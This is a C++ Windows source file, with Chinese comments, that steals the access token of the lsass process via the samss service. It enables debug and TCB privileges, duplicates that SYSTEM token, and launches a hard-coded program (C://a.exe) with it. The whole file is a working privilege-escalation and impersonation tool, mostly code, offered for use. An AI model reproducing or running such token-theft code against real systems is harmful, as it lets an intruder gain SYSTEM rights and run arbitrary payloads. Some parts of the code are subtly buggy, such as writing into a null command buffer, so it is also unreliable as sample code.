#include<windows.h>
#include<iostream>
#include <userenv.h>
#include <ntdef.h>
#define UNLEN       256 

using namespace std;
/*
*通过服务名获取PID
*GetServicePid（
*	LPCWSTR ServiceName 具体的服务名
*）
*/

DWORD GetServicePid(LPCWSTR ServiceName)
{
	const SC_HANDLE controlManagerHandle = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
	if (nullptr == controlManagerHandle)
		throw runtime_error("Connecting to Service Control Manager failed");

	const SC_HANDLE serviceHandle = OpenServiceW(controlManagerHandle, ServiceName, SERVICE_QUERY_STATUS);
	CloseServiceHandle(controlManagerHandle);
	if (nullptr == serviceHandle)
		throw runtime_error("Opening service handle failed");

	SERVICE_STATUS_PROCESS procInfo;
	DWORD bytesNeeded;
	if (!QueryServiceStatusEx(serviceHandle, SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&procInfo), sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded))
	{
		CloseServiceHandle(serviceHandle);
		throw runtime_error("Querying service status failed");
	}

	CloseServiceHandle(serviceHandle);
	return procInfo.dwProcessId;
}

/*
*设置进程权限
*setPrivilege（
*	HANDLE hToken 目标进程句柄 ，
*	LPCWSTR name  设置的进程权限名
*）
*/
BOOL setPrivilege(HANDLE hToken, LPCWSTR name) {
	TOKEN_PRIVILEGES tp;
	LUID luid;


	if (!LookupPrivilegeValue(NULL, name, &luid)) {
		cout << "privilege error:" << GetLastError() << endl;
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
		cout << "adjustprivileges error:" << GetLastError() << endl;
		return FALSE;
	}
	return TRUE;
}

/*
*以Handle的令牌权限执行命令
*GetLocalSystem（
*	HANDLE hSystemToken 伪装权限的进程句柄，
*	LPCWSTR cmdName 以令牌权限执行的具体命令，如果为NULL，则创建当前进程
*）
*/
BOOL GetLocalSystem(HANDLE hSystemToken,LPCWSTR cmdName)
{
	BOOL bResult = FALSE;

	HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;

	DWORD dwCreationFlags = 0;
	LPWSTR pwszCurrentDirectory = NULL;
	LPVOID lpEnvironment = NULL;
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };

	BOOL g_bInteractWithConsole = FALSE;
	//如果为空就以目标进程权限打开当前进程
	if (cmdName == NULL) {
		GetModuleFileNameW(NULL, (LPWSTR)cmdName, UNLEN);
	}
	
	if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
	{
		wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}



	dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
	dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;

	if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
		goto cleanup;

	if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
	{
		wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}

	if (!CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE))
	{
		wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}

	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");


	if (!g_bInteractWithConsole)
	{
		if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, (LPWSTR)cmdName, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
		{
			wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
			goto cleanup;
		}
		else
		{
			wprintf(L"[+] CreateProcessWithTokenW() OK\n");
		}
	}
	else
	{
		wprintf(L"[!] CreateProcessWithTokenW() isn't compatible with option -i\n");
		goto cleanup;
	}


	if (g_bInteractWithConsole)
	{
		fflush(stdout);
		WaitForSingleObject(pi.hProcess, INFINITE);
	}

	bResult = TRUE;

cleanup:
	if (hSystemToken)
		CloseHandle(hSystemToken);
	if (hSystemTokenDup)
		CloseHandle(hSystemTokenDup);
	if (pwszCurrentDirectory)
		free(pwszCurrentDirectory);
	if (lpEnvironment)
		DestroyEnvironmentBlock(lpEnvironment);
	if (pi.hProcess)
		CloseHandle(pi.hProcess);
	if (pi.hThread)
		CloseHandle(pi.hThread);

	return bResult;
}
/*
*根据服务名创建服务进程权限执行命令
*getSystem(
*	LPCWSTR processName 具体服务名字，lsass进程是samss服务，
*	LPCWSTR cmdLine 以服务权限执行的命令，如果为空，则执行当前进程
*	
*）
*
*/


void getSystem(LPCWSTR processName, LPCWSTR cmdLine) {
	HANDLE tokenHandle = NULL;
	HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	setPrivilege(currentTokenHandle, SE_TCB_NAME);
	setPrivilege(currentTokenHandle, SE_DEBUG_NAME);

	HANDLE test = OpenProcess(PROCESS_QUERY_INFORMATION, true, GetServicePid(processName));
	if (GetLastError() == NULL) {
		cout << "ok" << endl;
	}
	else {
		cout << "openProcess return Code:" << test << endl;
		cout << "openProcess Error:" << GetLastError() << endl;
	}
	BOOL getToken = OpenProcessToken(test, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle);
	//BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);


	if (GetLastError() == NULL) {
		cout << "winlogon Impersonate ok " << endl;
	}
	else {
		cout << "something impeersonate error" << GetLastError() << endl;
	}
	GetLocalSystem(tokenHandle,cmdLine);
}


int main() {
	getSystem(L"samss", L"C://a.exe");
}